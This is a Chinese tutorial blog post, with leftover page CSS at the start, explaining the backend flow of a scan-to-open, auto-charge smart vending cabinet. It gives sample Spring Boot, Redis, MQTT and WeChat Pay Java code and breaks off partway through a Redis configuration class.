li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是大华。昨天在办公楼底下，我用了一下那种开门拿货，关门自动扣费的智能售货柜，真挺方便的。</p>
<p>其实这种售货柜并不少见，很多无人售货店、地铁站和景区都能经常看懂。</p>
<p>那这种流程是怎么实现的呢？下面我们来分析一下整个实现的流程。</p>
<p><strong>场景：</strong></p>
<ol>
<li>你用微信扫描售货柜上的二维码</li>
<li>柜门咔嚓一声自动打开</li>
<li>你拿出想要的商品，同时可以随意更换</li>
<li>关上柜门，然后手机自动收到扣款通知</li>
<li>整个过程中无需任何额外操作</li>
</ol>
<h2 data-id="heading-0">核心技术栈（Spingboot）</h2>

































<table><thead><tr><th>技术组件</th><th>作用</th></tr></thead><tbody><tr><td>Spring Boot</td><td>后端主框架</td></tr><tr><td>Redis</td><td>高速缓存</td></tr><tr><td>MQTT</td><td>物联网通信协议</td></tr><tr><td>MySQL</td><td>关系型数据库</td></tr><tr><td>消息队列</td><td>异步任务处理</td></tr><tr><td>计算机视觉</td><td>拍摄商品识别</td></tr></tbody></table>
<h2 data-id="heading-1">完整技术流程详解</h2>
<h3 data-id="heading-2">第一阶段：扫码开门（身份验证与初始化）</h3>
<p><strong>用户动作</strong>：微信扫码 → 授权 → 柜门打开</p>
<p><strong>后台流程</strong>：</p>
<ol>
<li><strong>身份认证</strong>：验证微信账号的合法性</li>
<li><strong>设备状态检查</strong>：确认售货柜是否可用</li>
<li><strong>创建会话</strong>：在Redis中建立临时购物车</li>
<li><strong>数据采集</strong>：拍摄货架初始照片，记录传感器数据</li>
<li><strong>开门指令</strong>：通过MQTT协议发送开门命令</li>
</ol>
<p><strong>技术要点</strong>：</p>
<ul>
<li>使用Redis存储临时会话，读写速度达到微秒级</li>
<li>MQTT协议专为物联网设计，低功耗、高可靠</li>
<li>初始快照为后续对比提供基准数据</li>
</ul>
<h3 data-id="heading-3">第二阶段：自由选购（实时事件追踪）</h3>
<p><strong>用户动作</strong>：拿取商品 → 可能更换 → 继续选购</p>
<p><strong>系统监控</strong>：</p>
<ol>
<li><strong>视觉追踪</strong>：摄像头实时识别手部动作和商品变化</li>
<li><strong>重量感应</strong>：每个货道的传感器监测重量变化</li>
<li><strong>事件上报</strong>：实时将"拿取/放回"动作发送到后台</li>
<li><strong>实时记录</strong>：在Redis中更新购物车状态</li>
</ol>
<p><strong>技术难点突破</strong>：</p>
<ul>
<li>实时视频流处理，延迟控制在100ms以内</li>
<li>多传感器数据融合，提高识别准确率</li>
<li>高并发事件处理，支持多用户同时购物</li>
</ul>
<h3 data-id="heading-4">第三阶段：关门结算（异步清算流程）</h3>
<p><strong>用户动作</strong>：关闭柜门 → 自动触发结算</p>
<p><strong>核心清算流程</strong>：</p>
<pre><code class="hljs">关门信号 → 启动异步任务 → 数据收集 → 三重校验 → 支付扣款 → 状态更新
</code></pre>
<p><strong>详细步骤</strong>：</p>
<ol>
<li><strong>触发结算</strong>：门磁传感器检测到关门动作</li>
<li><strong>异步处理</strong>：避免用户等待，另起线程处理复杂计算</li>
<li><strong>数据收集</strong>：获取关门快照和最终传感器数据</li>
<li><strong>三重校验</strong>：
<ul>
<li>视觉对比：开门vs关门图片差异分析</li>
<li>重量分析：各货道重量变化计算</li>
<li>事件复核：核对实时记录的事件序列</li>
</ul>
</li>
<li><strong>冲突解决</strong>：当三种方式结果不一致时的智能决策</li>
<li><strong>支付执行</strong>：调用支付接口完成扣款</li>
<li><strong>状态更新</strong>：标记订单完成，清理缓存</li>
</ol>
<h2 data-id="heading-5">示例代码实现</h2>
<h3 data-id="heading-6">1. 核心数据模型</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 订单实体</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "vending_orders")</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VendingOrder</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-keyword">private</span> String orderId;
    <span class="hljs-keyword">private</span> String userId;          <span class="hljs-comment">// 用户ID</span>
    <span class="hljs-keyword">private</span> String deviceId;        <span class="hljs-comment">// 设备ID</span>
    <span class="hljs-keyword">private</span> String status;          <span class="hljs-comment">// 状态: OPEN/CLOSED/PAID/FAILED</span>
    <span class="hljs-keyword">private</span> BigDecimal amount;      <span class="hljs-comment">// 订单金额</span>
    <span class="hljs-keyword">private</span> LocalDateTime createTime;
    <span class="hljs-keyword">private</span> LocalDateTime updateTime;
}

<span class="hljs-comment">// Redis缓存中的设备会话</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeviceSession</span> {
    <span class="hljs-keyword">private</span> String sessionId;
    <span class="hljs-keyword">private</span> String deviceId;
    <span class="hljs-keyword">private</span> String orderId;
    <span class="hljs-keyword">private</span> String userId;
    <span class="hljs-keyword">private</span> String status;          <span class="hljs-comment">// 会话状态</span>
    <span class="hljs-keyword">private</span> LocalDateTime startTime;
    <span class="hljs-keyword">private</span> List&lt;DeviceEvent&gt; events; <span class="hljs-comment">// 购物事件记录</span>
}

<span class="hljs-comment">// 设备事件</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeviceEvent</span> {
    <span class="hljs-keyword">private</span> String eventId;
    <span class="hljs-keyword">private</span> String deviceId;
    <span class="hljs-keyword">private</span> String orderId;
    <span class="hljs-keyword">private</span> String type;            <span class="hljs-comment">// PICK/PUT_BACK</span>
    <span class="hljs-keyword">private</span> String productId;
    <span class="hljs-keyword">private</span> LocalDateTime eventTime;
    <span class="hljs-keyword">private</span> String position;        <span class="hljs-comment">// 货道位置</span>
}
</code></pre>
<h3 data-id="heading-7">2. 控制器层 - 处理HTTP请求</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/vending")</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VendingController</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> VendingService vendingService;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> SettlementService settlementService;
    
    <span class="hljs-comment">/**
     * 扫码开门接口
     */</span>
    <span class="hljs-meta">@PostMapping("/open")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;ApiResponse&gt; <span class="hljs-title function_">openDevice</span><span class="hljs-params">(
            <span class="hljs-meta">@RequestParam</span> String deviceId,
            <span class="hljs-meta">@RequestParam</span> String authToken)</span> {
        
        log.info(<span class="hljs-string">"收到开门请求: deviceId={}"</span>, deviceId);
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">OpenResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> vendingService.processOpenDevice(deviceId, authToken);
            <span class="hljs-keyword">return</span> ResponseEntity.ok(ApiResponse.success(result));
            
        } <span class="hljs-keyword">catch</span> (BusinessException e) {
            log.warn(<span class="hljs-string">"开门业务异常: {}"</span>, e.getMessage());
            <span class="hljs-keyword">return</span> ResponseEntity.badRequest().body(ApiResponse.error(e.getMessage()));
        }
    }
    
    <span class="hljs-comment">/**
     * 查询订单状态
     */</span>
    <span class="hljs-meta">@GetMapping("/order/{orderId}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;ApiResponse&gt; <span class="hljs-title function_">getOrderStatus</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String orderId)</span> {
        <span class="hljs-type">VendingOrder</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> vendingService.getOrderById(orderId);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(ApiResponse.success(order));
    }
}

<span class="hljs-comment">// 统一API响应格式</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiResponse</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> success;
    <span class="hljs-keyword">private</span> String message;
    <span class="hljs-keyword">private</span> Object data;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ApiResponse <span class="hljs-title function_">success</span><span class="hljs-params">(Object data)</span> {
        <span class="hljs-type">ApiResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApiResponse</span>();
        response.setSuccess(<span class="hljs-literal">true</span>);
        response.setData(data);
        <span class="hljs-keyword">return</span> response;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ApiResponse <span class="hljs-title function_">error</span><span class="hljs-params">(String message)</span> {
        <span class="hljs-type">ApiResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApiResponse</span>();
        response.setSuccess(<span class="hljs-literal">false</span>);
        response.setMessage(message);
        <span class="hljs-keyword">return</span> response;
    }
}
</code></pre>
<h3 data-id="heading-8">3. 核心服务层 - 开门处理</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VendingService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserAuthService authService;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> DeviceService deviceService;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> MqttService mqttService;
    
    <span class="hljs-comment">/**
     * 处理开门请求的核心逻辑
     */</span>
    <span class="hljs-keyword">public</span> OpenResult <span class="hljs-title function_">processOpenDevice</span><span class="hljs-params">(String deviceId, String authToken)</span> {
        <span class="hljs-comment">// 1. 用户身份验证</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> authService.verifyWechatToken(authToken);
        <span class="hljs-keyword">if</span> (userId == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BusinessException</span>(<span class="hljs-string">"用户身份验证失败"</span>);
        }
        
        <span class="hljs-comment">// 2. 检查设备状态</span>
        <span class="hljs-type">DeviceStatus</span> <span class="hljs-variable">deviceStatus</span> <span class="hljs-operator">=</span> deviceService.getDeviceStatus(deviceId);
        <span class="hljs-keyword">if</span> (!deviceStatus.isAvailable()) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BusinessException</span>(<span class="hljs-string">"设备暂不可用: "</span> + deviceStatus.getStatus());
        }
        
        <span class="hljs-comment">// 3. 创建订单</span>
        <span class="hljs-type">VendingOrder</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderService.createOrder(userId, deviceId);
        log.info(<span class="hljs-string">"创建订单成功: orderId={}, userId={}, deviceId={}"</span>, 
                order.getOrderId(), userId, deviceId);
        
        <span class="hljs-comment">// 4. 创建设备会话并缓存</span>
        <span class="hljs-type">DeviceSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> createDeviceSession(deviceId, order);
        cacheDeviceSession(session);
        
        <span class="hljs-comment">// 5. 锁定设备，避免重复开门</span>
        deviceService.lockDevice(deviceId, order.getOrderId());
        
        <span class="hljs-comment">// 6. 发送开门指令</span>
        mqttService.sendOpenCommand(deviceId);
        
        <span class="hljs-comment">// 7. 请求设备上报初始状态</span>
        mqttService.requestInitialSnapshot(deviceId);
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenResult</span>(order.getOrderId(), deviceId, <span class="hljs-string">"开门指令已发送"</span>);
    }
    
    <span class="hljs-keyword">private</span> DeviceSession <span class="hljs-title function_">createDeviceSession</span><span class="hljs-params">(String deviceId, VendingOrder order)</span> {
        <span class="hljs-type">DeviceSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeviceSession</span>();
        session.setSessionId(UUID.randomUUID().toString());
        session.setDeviceId(deviceId);
        session.setOrderId(order.getOrderId());
        session.setUserId(order.getUserId());
        session.setStatus(<span class="hljs-string">"OPEN"</span>);
        session.setStartTime(LocalDateTime.now());
        session.setEvents(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;());
        <span class="hljs-keyword">return</span> session;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cacheDeviceSession</span><span class="hljs-params">(DeviceSession session)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> buildSessionKey(session.getDeviceId());
        redisTemplate.opsForValue().set(key, session, Duration.ofMinutes(<span class="hljs-number">10</span>));
        log.debug(<span class="hljs-string">"设备会话已缓存: key={}"</span>, key);
    }
    
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">buildSessionKey</span><span class="hljs-params">(String deviceId)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"vending:session:"</span> + deviceId;
    }
}
</code></pre>
<h3 data-id="heading-9">4. MQTT消息处理 - 设备通信</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MqttMessageHandler</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> VendingService vendingService;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> SettlementService settlementService;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;
    
    <span class="hljs-comment">/**
     * 处理关门事件 - 触发结算流程
     */</span>
    <span class="hljs-meta">@MqttListener(topics = "device/${spring.application.env}/+/event/door_close")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleDoorClose</span><span class="hljs-params">(String message)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">DoorCloseEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> JSON.parseObject(message, DoorCloseEvent.class);
            log.info(<span class="hljs-string">"收到关门事件: deviceId={}"</span>, event.getDeviceId());
            
            <span class="hljs-comment">// 异步处理结算，不阻塞MQTT线程</span>
            CompletableFuture.runAsync(() -&gt; {
                settlementService.startSettlementProcess(event.getDeviceId());
            });
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"处理关门事件失败: message={}"</span>, message, e);
        }
    }
    
    <span class="hljs-comment">/**
     * 处理商品拿取/放回事件
     */</span>
    <span class="hljs-meta">@MqttListener(topics = "device/${spring.application.env}/+/event/product")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleProductEvent</span><span class="hljs-params">(String message)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">ProductEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> JSON.parseObject(message, ProductEvent.class);
            log.debug(<span class="hljs-string">"处理商品事件: deviceId={}, type={}, product={}"</span>, 
                     event.getDeviceId(), event.getEventType(), event.getProductId());
            
            <span class="hljs-comment">// 记录到Redis缓存</span>
            recordProductEvent(event);
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"处理商品事件失败: message={}"</span>, message, e);
        }
    }
    
    <span class="hljs-comment">/**
     * 处理设备上报的初始/最终快照
     */</span>
    <span class="hljs-meta">@MqttListener(topics = "device/${spring.application.env}/+/snapshot")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleSnapshot</span><span class="hljs-params">(String message)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">DeviceSnapshot</span> <span class="hljs-variable">snapshot</span> <span class="hljs-operator">=</span> JSON.parseObject(message, DeviceSnapshot.class);
            log.info(<span class="hljs-string">"处理设备快照: deviceId={}, type={}"</span>, 
                    snapshot.getDeviceId(), snapshot.getSnapshotType());
            
            <span class="hljs-comment">// 存储快照数据，用于后续对比分析</span>
            storeDeviceSnapshot(snapshot);
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"处理快照失败: message={}"</span>, message, e);
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recordProductEvent</span><span class="hljs-params">(ProductEvent event)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">sessionKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"vending:session:"</span> + event.getDeviceId();
        <span class="hljs-type">DeviceSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> (DeviceSession) redisTemplate.opsForValue().get(sessionKey);
        
        <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">DeviceEvent</span> <span class="hljs-variable">deviceEvent</span> <span class="hljs-operator">=</span> convertToDeviceEvent(event, session.getOrderId());
            session.getEvents().add(deviceEvent);
            redisTemplate.opsForValue().set(sessionKey, session, Duration.ofMinutes(<span class="hljs-number">10</span>));
        }
    }
}
</code></pre>
<h3 data-id="heading-10">5. 结算服务 - 核心业务逻辑</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SettlementService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> DeviceService deviceService;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> PaymentService paymentService;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> NotificationService notificationService;
    
    <span class="hljs-comment">/**
     * 启动结算流程
     */</span>
    <span class="hljs-meta">@Async("settlementExecutor")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startSettlementProcess</span><span class="hljs-params">(String deviceId)</span> {
        log.info(<span class="hljs-string">"开始结算流程: deviceId={}"</span>, deviceId);
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. 获取设备会话</span>
            <span class="hljs-type">DeviceSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> getDeviceSession(deviceId);
            <span class="hljs-keyword">if</span> (session == <span class="hljs-literal">null</span>) {
                log.error(<span class="hljs-string">"设备会话不存在: deviceId={}"</span>, deviceId);
                <span class="hljs-keyword">return</span>;
            }
            
            <span class="hljs-comment">// 2. 更新订单状态为结算中</span>
            orderService.updateOrderStatus(session.getOrderId(), <span class="hljs-string">"SETTLING"</span>);
            
            <span class="hljs-comment">// 3. 获取设备上报的最终数据</span>
            <span class="hljs-type">SettlementData</span> <span class="hljs-variable">settlementData</span> <span class="hljs-operator">=</span> collectSettlementData(deviceId);
            
            <span class="hljs-comment">// 4. 执行结算计算</span>
            <span class="hljs-type">SettlementResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> calculateSettlement(settlementData);
            
            <span class="hljs-comment">// 5. 处理支付</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">paymentSuccess</span> <span class="hljs-operator">=</span> processPayment(session, result);
            
            <span class="hljs-comment">// 6. 更新订单状态</span>
            updateOrderAfterSettlement(session, result, paymentSuccess);
            
            <span class="hljs-comment">// 7. 清理资源</span>
            cleanupAfterSettlement(deviceId, session.getOrderId());
            
            log.info(<span class="hljs-string">"结算流程完成: deviceId={}, orderId={}, success={}"</span>, 
                    deviceId, session.getOrderId(), paymentSuccess);
                    
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"结算流程异常: deviceId={}"</span>, deviceId, e);
            handleSettlementFailure(deviceId, e);
        }
    }
    
    <span class="hljs-comment">/**
     * 收集结算所需的所有数据
     */</span>
    <span class="hljs-keyword">private</span> SettlementData <span class="hljs-title function_">collectSettlementData</span><span class="hljs-params">(String deviceId)</span> {
        <span class="hljs-type">SettlementData</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SettlementData</span>();
        
        <span class="hljs-comment">// 获取初始和最终快照</span>
        data.setInitialSnapshot(deviceService.getInitialSnapshot(deviceId));
        data.setFinalSnapshot(deviceService.getFinalSnapshot(deviceId));
        
        <span class="hljs-comment">// 获取重量传感器数据</span>
        data.setWeightData(deviceService.getWeightSensorData(deviceId));
        
        <span class="hljs-comment">// 获取购物事件记录</span>
        data.setProductEvents(getRecordedEvents(deviceId));
        
        <span class="hljs-keyword">return</span> data;
    }
    
    <span class="hljs-comment">/**
     * 核心结算算法 - 三重校验
     */</span>
    <span class="hljs-keyword">private</span> SettlementResult <span class="hljs-title function_">calculateSettlement</span><span class="hljs-params">(SettlementData data)</span> {
        <span class="hljs-comment">// 1. 视觉对比分析</span>
        List&lt;Product&gt; visualProducts = analyzeVisualChanges(
            data.getInitialSnapshot(), 
            data.getFinalSnapshot()
        );
        
        <span class="hljs-comment">// 2. 重量变化分析</span>
        List&lt;Product&gt; weightProducts = analyzeWeightChanges(data.getWeightData());
        
        <span class="hljs-comment">// 3. 事件记录分析</span>
        List&lt;Product&gt; eventProducts = analyzeEventSequence(data.getProductEvents());
        
        <span class="hljs-comment">// 4. 冲突解决和结果融合</span>
        <span class="hljs-keyword">return</span> resolveProductConflicts(visualProducts, weightProducts, eventProducts);
    }
    
    <span class="hljs-comment">/**
     * 冲突解决策略
     */</span>
    <span class="hljs-keyword">private</span> SettlementResult <span class="hljs-title function_">resolveProductConflicts</span><span class="hljs-params">(List&lt;Product&gt; visualProducts, 
                                                    List&lt;Product&gt; weightProducts,
                                                    List&lt;Product&gt; eventProducts)</span> {
        <span class="hljs-type">SettlementResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SettlementResult</span>();
        
        <span class="hljs-comment">// 策略1: 视觉识别优先（最直接证据）</span>
        Map&lt;String, Product&gt; productMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        
        <span class="hljs-comment">// 首先信任视觉识别结果</span>
        <span class="hljs-keyword">for</span> (Product product : visualProducts) {
            productMap.put(product.getPosition(), product);
        }
        
        <span class="hljs-comment">// 用重量数据验证和补充</span>
        <span class="hljs-keyword">for</span> (Product weightProduct : weightProducts) {
            <span class="hljs-type">Product</span> <span class="hljs-variable">visualProduct</span> <span class="hljs-operator">=</span> productMap.get(weightProduct.getPosition());
            <span class="hljs-keyword">if</span> (visualProduct == <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// 视觉没识别到但重量有变化，信任重量数据</span>
                productMap.put(weightProduct.getPosition(), weightProduct);
            }
        }
        
        <span class="hljs-comment">// 用事件记录进行最终校验</span>
        result.setFinalProducts(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(productMap.values()));
        result.setConflictResolved(<span class="hljs-literal">true</span>);
        
        log.debug(<span class="hljs-string">"冲突解决完成: 视觉识别{}个, 重量变化{}个, 最终确认{}个"</span>, 
                 visualProducts.size(), weightProducts.size(), result.getFinalProducts().size());
        
        <span class="hljs-keyword">return</span> result;
    }
}
</code></pre>
<h3 data-id="heading-11">6. 支付服务</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> WechatPayService wechatPayService;
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;
    
    <span class="hljs-comment">/**
     * 执行支付
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">processPayment</span><span class="hljs-params">(DeviceSession session, SettlementResult result)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">PaymentRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PaymentRequest</span>();
            request.setUserId(session.getUserId());
            request.setOrderId(session.getOrderId());
            request.setAmount(calculateTotalAmount(result.getFinalProducts()));
            request.setDescription(<span class="hljs-string">"智能售货柜购物"</span>);
            
            <span class="hljs-type">PaymentResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> wechatPayService.unifiedOrder(request);
            
            <span class="hljs-keyword">if</span> (<span class="hljs-string">"SUCCESS"</span>.equals(response.getResultCode())) {
                log.info(<span class="hljs-string">"支付成功: orderId={}, amount={}"</span>, 
                        session.getOrderId(), request.getAmount());
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                log.warn(<span class="hljs-string">"支付失败: orderId={}, error={}"</span>, 
                        session.getOrderId(), response.getErrMsg());
                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            }
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"支付处理异常: orderId={}"</span>, session.getOrderId(), e);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
    
    <span class="hljs-keyword">private</span> BigDecimal <span class="hljs-title function_">calculateTotalAmount</span><span class="hljs-params">(List&lt;Product&gt; products)</span> {
        <span class="hljs-keyword">return</span> products.stream()
                .map(Product::getPrice)
                .reduce(BigDecimal.ZERO, BigDecimal::add);
    }
}
</code></pre>
<h3 data-id="heading-12">7. 配置类</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableAsync</span>
<span class="hljs-meta">@EnableScheduling</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncConfig</span> {
    
    <span class="hljs-meta">@Bean("settlementExecutor")</span>
    <span class="hljs-keyword">public</span> TaskExecutor <span class="hljs-title function_">settlementTaskExecutor</span><span class="hljs-params">()</span> {
        <span class="hljs-type">ThreadPoolTaskExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolTaskExecutor</span>();
        executor.setCorePoolSize(<span class="hljs-number">5</span>);
        executor.setMaxPoolSize(<span class="hljs-number">10</span>);
        executor.setQueueCapacity(<span class="hljs-number">100</span>);
        executor.setThreadNamePrefix(<span class="hljs-string">"settlement-"</span>);
        executor.setRejectedExecutionHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy());
        executor.initialize();
        <span class="hljs-keyword">return</span> executor;
    }
}

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="hljs-title function_">redisTemplate</span><span class="hljs-params">(RedisConnectionFactory factory)</span> {
        RedisTemplate&lt;String, Object&gt; template = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisTemplate</span>&lt;&gt;();
        template.setConnectionFactory(factory);
        template.setKeySerializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRedisSerializer</span>());
